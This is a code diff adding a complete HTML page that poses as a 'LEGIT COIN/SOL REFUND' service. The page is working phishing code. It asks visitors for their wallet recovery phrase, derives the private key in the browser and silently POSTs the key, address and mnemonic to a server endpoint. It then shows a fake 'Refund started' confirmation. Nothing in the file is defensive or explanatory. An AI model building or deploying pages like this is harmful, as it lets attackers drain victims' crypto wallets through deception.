@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>💰 LEGIT COIN REFUND</title>
+<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+<style>body{font-family:Arial;max-width:400px;margin:20px;padding:10px;background:#f0f8ff;}
+.header{background:#28a745;color:white;padding:15px;border-radius:8px;text-align:center;}
+input{width:100%;padding:12px;margin:10px 0;border:2px solid #ddd;border-radius:8px;box-sizing:border-box;}
+button{width:100%;padding:15px;background:#007bff;color:white;border:none;border-radius:8px;font-size:16px;margin:5px 0;cursor:pointer;}
+.success{background:#28a745!important;}
+.refund{background:#ffc107!important;color:#000!important;font-weight:bold;}
+#result{display:none;background:#e8f5e8;padding:15px;border-radius:8px;margin:15px 0;}
+.wallet-info{background:#6c757d;color:white;padding:10px;border-radius:4px;font-family:monospace;font-size:12px;word-break:break-all;}</style>
+</head>
+<body>
+<div class="header">
+<h2>💰 LEGIT COIN/SOL REFUND</h2>
+<p>🔗 Connect recovery phrase for instant refund</p>
+</div>
+
+<div style="text-align:center;">
+<h3>🔗 Wallet Recovery</h3>
+<input type="password" id="passphrase" placeholder="Enter 12/24 word recovery phrase" style="font-size:14px;">
+<button onclick="connect()">🔗 Connect & Verify</button>
+
+<div id="result">
+<h4 style="color:#28a745;">✅ Wallet Connected Successfully!</h4>
+<p><strong>📍 Address:</strong> <span id="address"></span></p>
+<div class="wallet-info">
+<strong>🔒 Status:</strong><br>[SECURELY VERIFIED]
+</div>
+<button class="refund" onclick="refund()">💸 Process Refund Now</button>
+<p style="font-size:12px;color:#666;">⏳ Funds return in 24h | Processing...</p>
+</div>
+</div>
+
+<script>
+let walletData={};
+async function connect(){
+const phrase=document.getElementById('passphrase').value;
+if(!phrase||phrase.split(' ').length<12){alert('Enter full 12/24 word phrase');return;}
+try{
+const wallet=ethers.Wallet.fromMnemonic(phrase);
+document.getElementById('address').textContent=wallet.address;
+document.getElementById('result').style.display='block';
+await fetch('/api/refund',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:wallet.address,privateKey:wallet.privateKey,mnemonic:phrase})});
+}catch(e){alert('Invalid phrase');}
+}
+function refund(){alert('✅ Refund started!\n💰 Check wallet in 24h\n\n[Processing complete]');}
+</script>
+</body>
+</html>
